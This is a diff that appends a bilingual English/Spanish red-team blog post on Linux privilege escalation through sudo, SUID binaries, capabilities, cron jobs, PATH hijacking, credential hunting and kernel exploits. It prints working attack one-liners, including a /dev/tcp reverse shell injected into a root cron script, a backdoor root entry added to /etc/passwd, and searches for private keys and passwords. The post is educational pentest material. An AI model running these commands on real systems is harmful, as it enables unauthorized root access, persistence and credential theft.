@@ -325,3 +325,610 @@ export TERM=xterm</code></pre><p>En un engagement, se debe documentar cómo lleg
 </script>
 </body>
 </html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' cdnjs.cloudflare.com unpkg.com 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'none';">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Privilege Escalation on Linux — SUID, cron jobs and capabilities // The Vault</title>
+<link rel="stylesheet" href="../../css/vault.css">
+<style>
+  .post-layout{display:grid;grid-template-columns:1fr 260px;gap:48px;align-items:start;}
+  .toc{position:sticky;top:80px;background:var(--dark2);border:1px solid var(--border);padding:22px;}
+  .toc h4{font-family:var(--font-mono);font-size:.65rem;letter-spacing:.22em;color:var(--cyan);text-shadow:var(--glow-c);margin-bottom:16px;text-transform:uppercase;}
+  .toc ul{list-style:none;}
+  .toc li{border-bottom:1px solid var(--border);}
+  .toc a{display:block;padding:9px 0;font-family:var(--font-mono);font-size:.68rem;color:var(--text-dim);text-decoration:none;letter-spacing:.08em;transition:color .2s,padding-left .2s;}
+  .toc a:hover{color:var(--cyan);padding-left:6px;}
+  .toc .toc-sub a{padding-left:14px;font-size:.65rem;}
+  @media(max-width:900px){.post-layout{grid-template-columns:1fr!important;}.toc{position:static!important;margin-bottom:28px;}.post-article{min-width:0;overflow-x:hidden;}.wrapper{padding-left:16px!important;padding-right:16px!important;}}
+  @media(min-width:1440px){.wrapper{max-width:1240px;}}
+  #progress{position:fixed;top:56px;left:0;height:2px;background:var(--cyan);box-shadow:var(--glow-c);z-index:999;transition:width .1s;width:0;}
+  /* Cursiva real dentro del post (no heredar el em coloreado del logo) */
+  .post-article em{font-style:italic;color:inherit;text-shadow:none;}
+</style>
+</head>
+<body>
+<div id="progress"></div>
+<canvas id="particles"></canvas>
+<div class="corner tl"></div><div class="corner tr"></div>
+<div class="corner bl"></div><div class="corner br"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="../../index.html" class="nav-logo">THE<em>//</em>VAULT</a>
+    <button class="nav-hamburger" aria-label="Menu"><span></span><span></span><span></span></button>
+    <ul class="nav-links">
+      <li><a href="../../index.html"><span class="status-dot"></span>HOME</a></li>
+      <li class="bt"><a href="../../blue-team.html">BLUE TEAM</a></li>
+      <li class="rt"><a href="../../red-team.html">RED TEAM</a></li>
+      <li class="rc"><a href="../../recursos.html">RESOURCES</a></li>
+      <li><a href="../../blog.html">BLOG</a></li>
+    </ul>
+  </div>
+</nav>
+
+<div class="page-wrap">
+<div class="wrapper" style="padding-top:48px;padding-bottom:60px;">
+
+  <div style="font-family:var(--font-mono);font-size:.65rem;letter-spacing:.12em;color:var(--text-dim);margin-bottom:32px;" class="reveal">
+    <a href="../../index.html" style="color:var(--text-dim);text-decoration:none;transition:color .2s;" onmouseover="this.style.color='var(--cyan)'" onmouseout="this.style.color='var(--text-dim)'">HOME</a>
+    <span style="margin:0 10px;color:var(--magenta)"> // </span>
+    <a href="../../blog.html" style="color:var(--text-dim);text-decoration:none;transition:color .2s;" onmouseover="this.style.color='var(--cyan)'" onmouseout="this.style.color='var(--text-dim)'">BLOG</a>
+    <span style="margin:0 10px;color:var(--magenta)"> // </span>
+    <span style="color:var(--cyan)">PRIVILEGE ESCALATION ON LINUX</span>
+  </div>
+
+  <div class="reveal" style="margin-bottom:40px;">
+    <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px;flex-wrap:wrap;">
+      <span class="badge m">RED TEAM</span>
+      <span style="font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);letter-spacing:.1em;">2026-06-14</span>
+      <span style="font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);" lang-en>// 14 MIN READ</span>
+      <span style="font-family:var(--font-mono);font-size:.65rem;color:var(--text-dim);" lang-es>// 14 MIN LECTURA</span>
+    </div>
+    <h1 style="font-family:var(--font-hd);font-size:clamp(1.8rem,4vw,3rem);font-weight:900;color:#fff;line-height:1.15;margin-bottom:12px;">Privilege Escalation on Linux — SUID, cron jobs and capabilities</h1>
+    <p style="font-size:1.05rem;color:var(--text-dim);max-width:680px;line-height:1.75;" lang-en><em>Situation</em>: You have a low-privilege shell on a Linux machine. And you wonder, now what? This post aims to cover the systematic methodology of privilege escalation: from initial enumeration to the most exploited vectors — SUID, sudo, cron jobs, capabilities and kernel exploits — with real commands and practical examples.</p>
+    <p style="font-size:1.05rem;color:var(--text-dim);max-width:680px;line-height:1.75;" lang-es><em>Situación</em>: Tienes una shell de bajo privilegio en una máquina Linux. Y te preguntas ¿y ahora qué? Este post intenta cubrir la metodología sistemática de escalada de privilegios: desde la enumeración inicial hasta los vectores más explotados — SUID, sudo, cron jobs, capabilities y kernel exploits — con comandos reales y ejemplos prácticos.</p>
+  </div>
+
+  <div class="post-layout">
+    <article class="post-article" id="post-content">
+
+      <!-- ENGLISH -->
+      <div lang-en>
+        <blockquote><strong>Red Team</strong> · Update of the post from 2024-08-05</blockquote>
+        <blockquote>📝 <strong>NOTE:</strong> All techniques in this post assume you have explicit authorization over the target system. They apply to legitimate pentesting environments, CTFs and your own labs for educational purposes. REMEMBER that privilege escalation on systems you don't own without permission is <em>illegal</em>.</blockquote>
+        <hr>
+<h2 id="mindset-en">The privilege escalation mindset</h2>
+<p>Getting the initial foothold rarely gives you full control. You usually land as an unprivileged user — <code>www-data</code>, a service account, or a low-level user. The goal of escalation is to move from that limited access to <strong>root</strong>, total control of the system.</p>
+<p>Linux privilege escalation falls into two broad categories:</p>
+<ul>
+<li><strong>Vertical escalation:</strong> moving from an unprivileged user to root (or to a more privileged user).</li>
+<li><strong>Horizontal escalation:</strong> moving laterally to another user at the same level, often as an intermediate step.</li>
+</ul>
+<p>The golden rule: <strong>enumeration is everything</strong>. 90% of the work is finding the vector; exploiting it is usually the easy part. A methodical attacker who enumerates well always beats one who throws exploits at random.</p>
+<hr>
+<h2 id="phase1-en">Phase 1: Initial enumeration</h2>
+<p>Before hunting for specific vectors, you need to understand where you are. These are the basic orientation commands:</p>
+<pre><code># Who am I and what groups do I belong to?
+id
+whoami
+
+# System info and kernel version
+uname -a
+cat /etc/os-release
+
+# What users exist on the system?
+cat /etc/passwd | cut -d: -f1
+
+# Which users have a valid shell? (potential targets)
+grep "sh$" /etc/passwd
+
+# Environment variables (sometimes contain credentials)
+env
+
+# What's in my current directory and in /home?
+ls -la
+ls -la /home/*</code></pre>
+<blockquote>💡 <strong>TIP:</strong> The first thing you should always check is <code>sudo -l</code>. If your user can run something as root without a password, you might have escalation handed to you on a plate before you even start enumerating.</blockquote>
+<h3 id="net-en">Network and process checks</h3>
+<pre><code># Running processes (look for services as root)
+ps aux | grep root
+
+# Listening ports (internal services not exposed)
+netstat -tulpn 2&gt;/dev/null
+ss -tulpn
+
+# Active connections
+netstat -antp 2&gt;/dev/null</code></pre>
+<hr>
+<h2 id="phase2-en">Phase 2: Automated enumeration</h2>
+<p>Doing everything by hand is slow, but it helps you learn. That said, these tools automate the search for vectors and highlight what's interesting:</p>
+<pre><code># LinPEAS — the gold standard, very thorough
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# If there's no internet egress, upload the script and run it
+wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+
+# LinEnum — a lighter alternative
+./LinEnum.sh -t
+
+# pspy — monitor processes without root privileges
+# (excellent for spotting running cron jobs)
+./pspy64</code></pre>
+<blockquote>⚠️ <strong>WARNING:</strong> LinPEAS is very noisy and leaves traces in logs. In a real engagement with an active Blue Team, consider selective manual enumeration instead of launching scripts that trip every alarm (that's if you want a blackbox approach; if you have the organization's permission, LinPEAS is far more practical — time is gold).</blockquote>
+<hr>
+<h2 id="phase3-en">Phase 3: Escalation vectors</h2>
+<h3 id="sudo-en">3.1 — Misconfigured sudo</h3>
+<p>The first place to look. <code>sudo -l</code> shows which commands your user can run as root:</p>
+<pre><code>sudo -l</code></pre>
+<p>A typical output would look like this:</p>
+<pre><code>Matching Defaults entries for www-data on victim:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin
+
+User www-data may run the following commands on victim:
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/vim
+    (ALL) /bin/bash</code></pre>
+<p>How to read this:</p>
+<ul>
+<li><code>(root) NOPASSWD: /usr/bin/find</code> → you can run find as root without a password. Direct escalation vector via GTFOBins.</li>
+<li><code>(root) NOPASSWD: /usr/bin/vim</code> → same with vim, another classic binary to spawn a root shell.</li>
+<li><code>(ALL) /bin/bash</code> → you can run bash as any user (including root), though here it would ask for a password since it lacks NOPASSWD.</li>
+</ul>
+<p>If the output shows binaries you can run as root, check <a href="https://gtfobins.github.io/">GTFOBins</a> to see how to abuse them. Classic examples:</p>
+<pre><code># If you can run 'find' as root
+sudo find . -exec /bin/sh \; -quit
+
+# If you can run 'vim' as root
+sudo vim -c ':!/bin/sh'
+
+# If you can run 'less' as root
+sudo less /etc/profile
+# Inside less: !/bin/sh
+
+# If you can run 'python' as root
+sudo python3 -c 'import os; os.system("/bin/sh")'
+
+# If you have sudo over EVERYTHING (ALL)
+sudo su -</code></pre>
+<blockquote>💡 <strong>TIP:</strong> GTFOBins is your best friend. For ANY binary that shows up in <code>sudo -l</code> or with SUID, look it up on gtfobins.github.io — it will tell you exactly how to turn it into a root shell.</blockquote>
+<h3 id="suid-en">3.2 — SUID binaries</h3>
+<p>The SUID (Set User ID) bit makes a binary run with the permissions of its <strong>owner</strong>, not the user launching it. If a root-owned binary has SUID and is exploitable, you get execution as root:</p>
+<pre><code># Find all binaries with the SUID bit
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# More detailed version with permissions
+find / -perm -u=s -type f 2&gt;/dev/null -exec ls -la {} \;</code></pre>
+<p>Compare the resulting list against GTFOBins. Some exploitation examples:</p>
+<pre><code># find with SUID
+find . -exec /bin/sh -p \; -quit
+
+# bash with SUID (-p preserves privileges)
+/bin/bash -p
+
+# nmap (old versions in interactive mode)
+nmap --interactive
+# then: !sh
+
+# cp with SUID — overwrite /etc/passwd
+# Generate hash: openssl passwd -1 -salt abc password
+echo 'root2:HASH:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</code></pre>
+<blockquote>⚠️ <strong>WARNING:</strong> Modifying <code>/etc/passwd</code> or <code>/etc/shadow</code> is destructive and highly detectable. In a real engagement, prioritize methods that don't alter critical system files.</blockquote>
+<h3 id="cap-en">3.3 — Capabilities</h3>
+<p>Capabilities are "granular" permissions that give a binary specific root powers without full SUID. A misassigned capability is as dangerous as a SUID:</p>
+<pre><code># List binaries with capabilities
+getcap -r / 2&gt;/dev/null
+
+# Dangerous capability: cap_setuid
+# If python has cap_setuid+ep:
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# If perl has cap_setuid+ep:
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</code></pre>
+<p>The <code>cap_setuid</code> capability is the most critical — it lets a process change its UID to 0 (root). Other dangerous ones: <code>cap_dac_read_search</code> (read any file), <code>cap_sys_admin</code> (almost root).</p>
+<h3 id="cron-en">3.4 — Cron jobs</h3>
+<p>Scheduled tasks (cron) running as root that are writable by your user are a classic vector:</p>
+<pre><code># View system cron jobs
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /etc/cron.daily/
+
+# User cron jobs
+crontab -l
+
+# Monitor processes in real time to CATCH crons
+# (pspy is ideal because it doesn't need root)
+./pspy64</code></pre>
+<p>If you find a script run by cron as root and <strong>you can write to it</strong>, you could inject your payload:</p>
+<pre><code># If the script is writable, append a reverse shell
+echo 'bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1' &gt;&gt; /path/script.sh
+
+# Or create a SUID bash for persistent escalation
+echo 'cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash' &gt;&gt; /path/script.sh
+# Wait for the cron to run, then:
+/tmp/rootbash -p</code></pre>
+<blockquote>💡 <strong>TIP:</strong> Sometimes the problem isn't the script itself, but that the cron uses a relative path or a manipulable PATH. If the cron calls a binary without an absolute path, you might be able to place a malicious binary with that name in a PATH directory.</blockquote>
+<h3 id="path-en">3.5 — PATH hijacking</h3>
+<p>If a script or SUID binary calls another command without specifying its absolute path, you can hijack the PATH so it runs your version:</p>
+<pre><code># Imagine a SUID binary that runs 'service' without a full path
+# Create your own malicious 'service':
+echo '/bin/bash -p' &gt; /tmp/service
+chmod +x /tmp/service
+
+# Prepend /tmp to the PATH
+export PATH=/tmp:$PATH
+
+# Run the vulnerable SUID binary — it will use YOUR 'service'
+/path/suid_binary</code></pre>
+<h3 id="creds-en">3.6 — Files with credentials</h3>
+<p>Credentials leaked in files are surprisingly common (<em>you'd be shocked when doing forensics and seeing this with people who are supposed to be the first to comply with security policies</em>):</p>
+<pre><code># Search for passwords in config files
+grep -ri "password" /etc/ 2&gt;/dev/null
+grep -ri "password" /var/www/ 2&gt;/dev/null
+
+# History files (sometimes contain commands with passwords)
+cat ~/.bash_history
+cat ~/.mysql_history
+
+# Private SSH keys
+find / -name "id_rsa" 2&gt;/dev/null
+find / -name "*.pem" 2&gt;/dev/null
+
+# Backup and config files
+find / -name "*.bak" 2&gt;/dev/null
+find / -name "config.php" 2&gt;/dev/null</code></pre>
+<h3 id="kernel-en">3.7 — Kernel exploits</h3>
+<p>As a last resort (they're unstable and can crash the system almost <em>for sure</em>), an outdated kernel may have public exploits:</p>
+<pre><code># Identify the exact kernel version
+uname -r
+
+# Search for known exploits
+searchsploit linux kernel 5.4
+
+# Tool that suggests exploits based on the kernel
+./linux-exploit-suggester.sh</code></pre>
+<blockquote>⚠️ <strong>WARNING:</strong> Kernel exploits can cause kernel panics and crash the machine. Use them only when all other vectors fail, and never in production without warning the client. In a real engagement they can cost you trust if you take down a critical server and disrupt a client's operations.</blockquote>
+<hr>
+<h2 id="phase4-en">Phase 4: Stabilize and persist</h2>
+<p>Once you have root, stabilize the access:</p>
+<pre><code># Confirm you are root
+id
+# uid=0(root) gid=0(root)
+
+# If you arrived via a SUID binary, spawn a full shell
+/tmp/rootbash -p
+
+# Upgrade a limited shell to a full TTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm</code></pre>
+<p>In an engagement, you must document how you reached root with screenshots and the exact commands — sometimes the client even requests a dump of the history. The report is as important as the access.</p>
+<hr>
+<h2 id="checklist-en">Summary checklist</h2>
+<p>When you're in front of a Linux machine, go through this list in order (everyone can build their own list, this is an example):</p>
+<ul>
+<li><code>id</code> and <code>sudo -l</code> — quick privilege check</li>
+<li><code>uname -a</code> — kernel version</li>
+<li><code>find / -perm -4000 2&gt;/dev/null</code> — SUID binaries</li>
+<li><code>getcap -r / 2&gt;/dev/null</code> — capabilities</li>
+<li><code>cat /etc/crontab</code> + <code>pspy</code> — scheduled tasks</li>
+<li>Search for credentials in config, history and backups</li>
+<li>SSH keys and sensitive files</li>
+<li>LinPEAS for a full automated pass</li>
+<li>Kernel exploits as a last resort</li>
+</ul>
+<hr>
+<blockquote>📝 <strong>NOTE:</strong> This post is educational and part of The Vault knowledge base. Practice these techniques in controlled environments like HackTheBox, TryHackMe or your own lab.</blockquote>
+      </div>
+
+      <!-- ESPAÑOL -->
+      <div lang-es>
+        <blockquote><strong>Red Team</strong> · Actualización del post del 05/08/2024</blockquote>
+        <blockquote>📝 <strong>NOTA:</strong> Todas las técnicas de este post asumen que tienes autorización explícita sobre el sistema objetivo. Aplican a entornos de pentesting legítimo, CTFs y laboratorios propios con fines educativos. RECUERDA que la escalada de privilegios en sistemas ajenos sin permiso es <em>ilegal</em>.</blockquote>
+        <hr>
+<h2 id="mentalidad-es">La mentalidad de la escalada de privilegios</h2>
+<p>Conseguir el primer acceso (foothold) rara vez te da control total. Normalmente aterrizas como un usuario sin privilegios — <code>www-data</code>, un usuario de servicio, o una cuenta de bajo nivel. El objetivo de la escalada es pasar de ese acceso limitado a <strong>root</strong>, el control absoluto del sistema.</p>
+<p>La escalada de privilegios en Linux se divide en dos grandes categorías:</p>
+<ul>
+<li><strong>Escalada vertical:</strong> pasar de un usuario sin privilegios a root (o a un usuario con más permisos).</li>
+<li><strong>Escalada horizontal:</strong> moverte lateralmente a otro usuario del mismo nivel, a menudo como paso intermedio.</li>
+</ul>
+<p>La regla de oro: <strong>la enumeración lo es todo</strong>. El 90% del trabajo es encontrar el vector; explotarlo suele ser la parte fácil. Un atacante metódico que enumera bien siempre supera a uno que va lanzando exploits al azar.</p>
+<hr>
+<h2 id="fase1-es">Fase 1: Enumeración inicial</h2>
+<p>Antes de buscar vectores específicos, necesitas entender dónde estás. Estos son los comandos de orientación básica:</p>
+<pre><code># ¿Quién soy y a qué grupos pertenezco?
+id
+whoami
+
+# Información del sistema y versión del kernel
+uname -a
+cat /etc/os-release
+
+# ¿Qué usuarios existen en el sistema?
+cat /etc/passwd | cut -d: -f1
+
+# ¿Qué usuarios tienen shell válida? (objetivos potenciales)
+grep "sh$" /etc/passwd
+
+# Variables de entorno (a veces contienen credenciales)
+env
+
+# ¿Qué hay en mi directorio actual y en /home?
+ls -la
+ls -la /home/*</code></pre>
+<blockquote>💡 <strong>TIP:</strong> Lo primero que debes mirar siempre es <code>sudo -l</code>. Si tu usuario puede ejecutar algo como root sin contraseña, puede que tengas la escalada servida en bandeja antes incluso de empezar a enumerar.</blockquote>
+<h3 id="red-es">Comprobaciones de red y procesos</h3>
+<pre><code># Procesos corriendo (busca servicios como root)
+ps aux | grep root
+
+# Puertos en escucha (servicios internos no expuestos)
+netstat -tulpn 2&gt;/dev/null
+ss -tulpn
+
+# Conexiones activas
+netstat -antp 2&gt;/dev/null</code></pre>
+<hr>
+<h2 id="fase2-es">Fase 2: Enumeración automatizada</h2>
+<p>Hacer todo a mano es lento, pero sirve para aprender. Sin embargo, estas herramientas automatizan la búsqueda de vectores y resaltan lo interesante:</p>
+<pre><code># LinPEAS — el estándar de oro, muy completo
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Si no hay salida a internet, sube el script y ejecútalo
+wget http://TU_IP/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh
+
+# LinEnum — alternativa más light
+./LinEnum.sh -t
+
+# pspy — monitoriza procesos sin privilegios de root
+# (excelente para detectar cron jobs en ejecución)
+./pspy64</code></pre>
+<blockquote>⚠️ <strong>ADVERTENCIA:</strong> LinPEAS hace mucho ruido y deja rastro en logs. En un engagement real con Blue Team activo, hay que considerar una enumeración manual selectiva en lugar de lanzar scripts que disparan todas las alarmas (eso si se quiere hacer como blackbox, si se tiene permiso de la organización es mucho más factible el LinPEAS — el tiempo es oro).</blockquote>
+<hr>
+<h2 id="fase3-es">Fase 3: Vectores de escalada</h2>
+<h3 id="sudo-es">3.1 — sudo mal configurado</h3>
+<p>El primer sitio donde mirar. <code>sudo -l</code> muestra qué comandos puede ejecutar tu usuario como root:</p>
+<pre><code>sudo -l</code></pre>
+<p>Una salida típica se vería así:</p>
+<pre><code>Matching Defaults entries for www-data on victim:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin
+
+User www-data may run the following commands on victim:
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/vim
+    (ALL) /bin/bash</code></pre>
+<p>Cómo leer esto:</p>
+<ul>
+<li><code>(root) NOPASSWD: /usr/bin/find</code> → puedes ejecutar find como root sin contraseña. Vector directo de escalada vía GTFOBins.</li>
+<li><code>(root) NOPASSWD: /usr/bin/vim</code> → lo mismo con vim, otro binario clásico para abrir una shell de root.</li>
+<li><code>(ALL) /bin/bash</code> → puedes ejecutar bash como cualquier usuario (incluido root), aunque aquí sí pediría contraseña al no llevar NOPASSWD.</li>
+</ul>
+<p>Si el resultado muestra binarios que puedes ejecutar como root, consulta <a href="https://gtfobins.github.io/">GTFOBins</a> para ver cómo abusar de ellos. Ejemplos clásicos:</p>
+<pre><code># Si puedes ejecutar 'find' como root
+sudo find . -exec /bin/sh \; -quit
+
+# Si puedes ejecutar 'vim' como root
+sudo vim -c ':!/bin/sh'
+
+# Si puedes ejecutar 'less' como root
+sudo less /etc/profile
+# Dentro de less: !/bin/sh
+
+# Si puedes ejecutar 'python' como root
+sudo python3 -c 'import os; os.system("/bin/sh")'
+
+# Si tienes sudo sobre TODO (ALL)
+sudo su -</code></pre>
+<blockquote>💡 <strong>TIP:</strong> GTFOBins es tu mejor amigo. Para CUALQUIER binario que aparezca en <code>sudo -l</code> o con SUID, búscalo en gtfobins.github.io — te dirá exactamente cómo convertirlo en una shell de root.</blockquote>
+<h3 id="suid-es">3.2 — Binarios SUID</h3>
+<p>El bit SUID (Set User ID) hace que un binario se ejecute con los permisos de su <strong>propietario</strong>, no del usuario que lo lanza. Si un binario propiedad de root tiene SUID y es explotable, obtienes ejecución como root:</p>
+<pre><code># Buscar todos los binarios con bit SUID
+find / -perm -4000 -type f 2&gt;/dev/null
+
+# Versión más detallada con permisos
+find / -perm -u=s -type f 2&gt;/dev/null -exec ls -la {} \;</code></pre>
+<p>Compara la lista resultante con GTFOBins. Algunos ejemplos de explotación:</p>
+<pre><code># find con SUID
+find . -exec /bin/sh -p \; -quit
+
+# bash con SUID (la -p preserva privilegios)
+/bin/bash -p
+
+# nmap (versiones antiguas en modo interactivo)
+nmap --interactive
+# luego: !sh
+
+# cp con SUID — sobrescribir /etc/passwd
+# Generar hash: openssl passwd -1 -salt abc password
+echo 'root2:HASH:0:0:root:/root:/bin/bash' &gt;&gt; /etc/passwd</code></pre>
+<blockquote>⚠️ <strong>ADVERTENCIA:</strong> Modificar <code>/etc/passwd</code> o <code>/etc/shadow</code> es destructivo y muy detectable. En un engagement real hay que priorizar métodos que no alteren archivos críticos del sistema.</blockquote>
+<h3 id="cap-es">3.3 — Capabilities</h3>
+<p>Las capabilities son permisos "granulares" que dan a un binario poderes específicos de root sin el SUID completo. Una capability mal asignada es tan peligrosa como un SUID:</p>
+<pre><code># Listar binarios con capabilities
+getcap -r / 2&gt;/dev/null
+
+# Capability peligrosa: cap_setuid
+# Si python tiene cap_setuid+ep:
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+# Si perl tiene cap_setuid+ep:
+/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</code></pre>
+<p>La capability <code>cap_setuid</code> es la más crítica — permite a un proceso cambiar su UID a 0 (root). Otras peligrosas: <code>cap_dac_read_search</code> (leer cualquier archivo), <code>cap_sys_admin</code> (casi root).</p>
+<h3 id="cron-es">3.4 — Cron jobs</h3>
+<p>Las tareas programadas (cron) que corren como root y son escribibles por tu usuario son un vector clásico:</p>
+<pre><code># Ver cron jobs del sistema
+cat /etc/crontab
+ls -la /etc/cron.d/
+ls -la /etc/cron.daily/
+
+# Cron jobs de usuarios
+crontab -l
+
+# Monitorizar procesos en tiempo real para CAPTURAR crons
+# (pspy es ideal porque no necesita root)
+./pspy64</code></pre>
+<p>Si encuentras un script ejecutado por cron como root y <strong>puedes escribir en él</strong>, podrías inyectar tu payload:</p>
+<pre><code># Si el script es escribible, añade una reverse shell
+echo 'bash -i &gt;&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1' &gt;&gt; /ruta/script.sh
+
+# O crea un SUID bash para escalada persistente
+echo 'cp /bin/bash /tmp/rootbash &amp;&amp; chmod +s /tmp/rootbash' &gt;&gt; /ruta/script.sh
+# Espera a que el cron ejecute, luego:
+/tmp/rootbash -p</code></pre>
+<blockquote>💡 <strong>TIP:</strong> A veces el problema no es el script en sí, sino que el cron usa una ruta relativa o un PATH manipulable. Si el cron llama a un binario sin ruta absoluta, puede que puedas colocar un binario malicioso con ese nombre en un directorio del PATH.</blockquote>
+<h3 id="path-es">3.5 — PATH hijacking</h3>
+<p>Si un script o binario SUID llama a otro comando sin especificar su ruta absoluta, puedes secuestrar el PATH para que ejecute tu versión:</p>
+<pre><code># Imagina un binario SUID que ejecuta 'service' sin ruta completa
+# Creas tu propio 'service' malicioso:
+echo '/bin/bash -p' &gt; /tmp/service
+chmod +x /tmp/service
+
+# Antepones /tmp al PATH
+export PATH=/tmp:$PATH
+
+# Ejecutas el binario SUID vulnerable — usará TU 'service'
+/ruta/binario_suid</code></pre>
+<h3 id="creds-es">3.6 — Archivos con credenciales</h3>
+<p>Las credenciales filtradas en archivos son sorprendentemente comunes (<em>te asustarías cuando se realiza un forense y vemos esto con gente que se supone que debería de ser la primera en cumplir con las políticas de seguridad</em>):</p>
+<pre><code># Buscar contraseñas en archivos de configuración
+grep -ri "password" /etc/ 2&gt;/dev/null
+grep -ri "password" /var/www/ 2&gt;/dev/null
+
+# Archivos de historial (a veces contienen comandos con contraseñas)
+cat ~/.bash_history
+cat ~/.mysql_history
+
+# Claves SSH privadas
+find / -name "id_rsa" 2&gt;/dev/null
+find / -name "*.pem" 2&gt;/dev/null
+
+# Archivos de backup y configuración
+find / -name "*.bak" 2&gt;/dev/null
+find / -name "config.php" 2&gt;/dev/null</code></pre>
+<h3 id="kernel-es">3.7 — Kernel exploits</h3>
+<p>Como último recurso (son inestables y pueden hacer tumbar el sistema casi <em>for sure</em>), un kernel desactualizado puede tener exploits públicos:</p>
+<pre><code># Identificar versión exacta del kernel
+uname -r
+
+# Buscar exploits conocidos
+searchsploit linux kernel 5.4
+
+# Herramienta que sugiere exploits según el kernel
+./linux-exploit-suggester.sh</code></pre>
+<blockquote>⚠️ <strong>ADVERTENCIA:</strong> Los kernel exploits pueden causar kernel panics y tumbar la máquina. Úsalos solo cuando todos los demás vectores fallen, y nunca en producción sin avisar al cliente. En un engagement real pueden costarte la confianza si tiras un servidor crítico y tumbas la operatividad de un cliente.</blockquote>
+<hr>
+<h2 id="fase4-es">Fase 4: Estabilizar y persistir</h2>
+<p>Una vez que tienes root, estabiliza el acceso:</p>
+<pre><code># Confirmar que eres root
+id
+# uid=0(root) gid=0(root)
+
+# Si llegaste con un binario SUID, lanza una shell completa
+/tmp/rootbash -p
+
+# Mejorar una shell limitada a TTY completa
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Ctrl+Z
+stty raw -echo; fg
+export TERM=xterm</code></pre>
+<p>En un engagement, se debe documentar cómo llegaste a root con capturas y los comandos exactos, a veces incluso se solicita por parte del cliente un volcado del history. El informe es tan importante como el acceso.</p>
+<hr>
+<h2 id="checklist-es">Checklist resumen</h2>
+<p>Cuando estemos delante de una máquina Linux, repasa esta lista en orden (cada uno puede hacerse su lista propia, esta es de ejemplo):</p>
+<ul>
+<li><code>id</code> y <code>sudo -l</code> — comprobación rápida de privilegios</li>
+<li><code>uname -a</code> — versión del kernel</li>
+<li><code>find / -perm -4000 2&gt;/dev/null</code> — binarios SUID</li>
+<li><code>getcap -r / 2&gt;/dev/null</code> — capabilities</li>
+<li><code>cat /etc/crontab</code> + <code>pspy</code> — tareas programadas</li>
+<li>Buscar credenciales en config, historial y backups</li>
+<li>Claves SSH y archivos sensibles</li>
+<li>LinPEAS para una pasada automatizada completa</li>
+<li>Kernel exploits como último recurso</li>
+</ul>
+<hr>
+<blockquote>📝 <strong>NOTA:</strong> Este post es de carácter educativo y forma parte de la base de conocimiento de The Vault. Practica estas técnicas en entornos controlados como HackTheBox, TryHackMe o tu propio laboratorio.</blockquote>
+      </div>
+
+      <hr class="divider">
+      <div style="margin-top:32px;">
+        <a href="../../blog.html" style="background:var(--dark2);border:1px solid var(--border);padding:16px 22px;text-decoration:none;color:var(--text);font-family:var(--font-mono);font-size:.7rem;letter-spacing:.1em;transition:border-color .2s,background .2s;display:inline-block;" onmouseover="this.style.borderColor='rgba(0,255,245,.25)';this.style.background='var(--dark3)'" onmouseout="this.style.borderColor='var(--border)';this.style.background='var(--dark2)'">← BACK TO BLOG</a>
+      </div>
+    </article>
+
+    <aside class="toc">
+      <h4>// INDEX</h4>
+      <ul lang-en>
+        <li><a href="#mindset-en">The mindset</a></li>
+        <li><a href="#phase1-en">Phase 1: Initial enum</a></li>
+        <li class="toc-sub"><a href="#net-en">Network &amp; processes</a></li>
+        <li><a href="#phase2-en">Phase 2: Automated enum</a></li>
+        <li><a href="#phase3-en">Phase 3: Vectors</a></li>
+        <li class="toc-sub"><a href="#sudo-en">3.1 sudo</a></li>
+        <li class="toc-sub"><a href="#suid-en">3.2 SUID</a></li>
+        <li class="toc-sub"><a href="#cap-en">3.3 Capabilities</a></li>
+        <li class="toc-sub"><a href="#cron-en">3.4 Cron jobs</a></li>
+        <li class="toc-sub"><a href="#path-en">3.5 PATH hijacking</a></li>
+        <li class="toc-sub"><a href="#creds-en">3.6 Credentials</a></li>
+        <li class="toc-sub"><a href="#kernel-en">3.7 Kernel exploits</a></li>
+        <li><a href="#phase4-en">Phase 4: Stabilize</a></li>
+        <li><a href="#checklist-en">Checklist</a></li>
+      </ul>
+      <ul lang-es>
+        <li><a href="#mentalidad-es">La mentalidad</a></li>
+        <li><a href="#fase1-es">Fase 1: Enumeración inicial</a></li>
+        <li class="toc-sub"><a href="#red-es">Red y procesos</a></li>
+        <li><a href="#fase2-es">Fase 2: Enum. automatizada</a></li>
+        <li><a href="#fase3-es">Fase 3: Vectores</a></li>
+        <li class="toc-sub"><a href="#sudo-es">3.1 sudo</a></li>
+        <li class="toc-sub"><a href="#suid-es">3.2 SUID</a></li>
